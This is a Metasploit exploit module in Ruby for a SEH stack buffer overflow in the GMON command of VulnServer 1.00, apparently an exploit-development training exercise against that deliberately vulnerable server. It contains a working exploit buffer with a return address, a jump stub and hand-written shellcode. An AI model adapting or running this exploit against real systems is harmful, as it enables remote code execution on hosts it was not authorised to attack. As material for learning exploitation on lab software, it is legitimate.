##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'VulnServer GMON SEH buffer overflow',
      'Description' => %q{
        This module exploits a stack buffer overflow in VulnServer version 1.00.
      },
      'Author' => 'Werebug',
      'References' =>
        [
          ['Source', 'http://www.thegreycorner.com/p/vulnserver.html'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 10 Enterprise 10.0.17763 N/A Build 17763', 
            {
              'Ret' => 0x6250172B,
              'Offset' => 3550,
            }
          ],
        ],
      ))

    register_options(
      [
        Opt::RPORT(9999)
      ], self)
  end

  def exploit
    connect

    print_status("Trying target #{target.name}...")

    buffer = "GMON /"
    buffer << rand_text_alpha_upper(2000)
    buffer << make_nops(700)
    buffer << payload.encoded
    buffer << rand_text_alpha_upper(target['Offset'] - 2700 - payload.encoded.length)
    buffer << "\xeb\x06\x90\x90"
    buffer << [target['Ret']].pack('V')
    buffer << "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1"
    buffer << rand_text_alpha_upper(5000 - buffer.length)

    sock.put(buffer)

    disconnect
  end
end
